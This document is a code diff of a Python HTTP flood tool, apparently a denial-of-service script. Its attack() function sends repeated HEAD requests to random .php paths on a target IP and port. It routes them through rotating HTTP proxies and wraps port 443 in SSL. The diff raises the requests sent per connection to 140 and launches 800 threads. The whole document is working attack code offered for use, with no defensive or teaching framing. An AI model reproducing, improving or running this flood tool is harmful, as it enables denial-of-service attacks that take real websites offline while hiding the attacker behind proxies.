@@ -45,7 +45,7 @@ acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
 		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
+		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
 		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
 		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 		"Accept: text/html, application/xhtml+xml",
@@ -100,18 +100,6 @@ def rqheader():
     header =  connection + useragent + accept + referer + "\r\n"
     return header
 
-def port443(x,request):
-    try:
-        for i in range(100):
-            x.send(str.encode(request))
-    except:
-        x.close()
-        try:
-            for i in range(100):
-                 x.send(str.encode(request))
-        except:
-            x.close()
-
 def attack():
     global path
     global num_sent
@@ -123,32 +111,61 @@ def attack():
         try:
             if rpath == True:
                 path = "/"+Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + ".php"
-            get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+            get_host = "HEAD " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
             request = get_host + header
             s = socks.socksocket()
             s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.connect((ip, port))
-            num_sent = num_sent + 1
-            sys.stdout.write("[+] [Failed Request]: " + str(req_error) + " ["+ str(num_sent) + " SENT "+ str(proxy[0])+":"+str(proxy[1]) +"] => "+ip+":"+str(port)+path+"\r")
             if port == 443:
                 x = ssl.wrap_socket(s)
-                port443(x,request)
+                try:
+                    for i in range(140):
+                        sent = x.send(str.encode(request))
+                        if not sent:
+                            proxy = Choice(proxies).strip().split(":")
+                            break
+                        num_sent = num_sent + 1
+                    x.close()
+                except:
+                    for i in range(140):
+                        sent = x.send(str.encode(request))
+                        if not sent:
+                            proxy = Choice(proxies).strip().split(":")
+                            break
+                        num_sent = num_sent + 1
+                    x.close()
+            else:
+                try:
+                    for i in range(140):
+                        sent = s.send(str.encode(request))
+                        num_sent = num_sent + 1
+                        if not sent:
+                            proxy = Choice(proxies).strip().split(":")
+                            break
+                        num_sent = num_sent + 1
+                    s.close()
+                except:
+                    for i in range(140):
+                        sent = s.send(str.encode(request))
+                        num_sent = num_sent + 1
+                        if not sent:
+                            proxy = Choice(proxies).strip().split(":")
+                            break
+                        num_sent = num_sent + 1
+                    s.close()
         except:
             req_error=req_error+1
+            s.close()
+        sys.stdout.write("[+] [Failed Request]: " + str(req_error) + " ["+ str(num_sent) + " SENT "+ str(proxy[0])+":"+str(proxy[1]) +"] => "+ip+":"+str(port)+path+"         \r")
         sys.stdout.flush()
-
-def build_thread():
-	for _ in range(300):
-		bth = threading.Thread(target=attack)
-		bth.start()
 
 def build_process(process_num):
 	for y in range(process_num):
-		th = multiprocessing.Process (target=build_thread)
+		th = threading.Thread(target=attack)
 		go.clear()
 		go.set()
 		th.start()
 
 go = threading.Event()
-build_process(15)
+build_process(800)
 time.sleep(period)
